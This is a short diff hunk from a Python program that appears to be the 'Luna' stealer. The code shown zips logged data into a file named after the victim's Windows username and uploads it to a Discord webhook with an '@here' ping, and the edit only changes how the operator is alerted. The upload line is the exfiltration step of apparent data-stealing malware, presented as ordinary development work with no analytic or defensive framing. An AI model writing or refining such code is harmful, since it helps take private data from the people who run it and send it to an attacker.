@@ -53,7 +53,7 @@ def main(webhook):
     _file = None
     _file = File(f'Luna-Logged-{os.getenv("Username")}.zip')
 
-    webhook.send(content="@everyone", embed=embed, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+    webhook.send(content="@here", embed=embed, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
 
 def Luna():
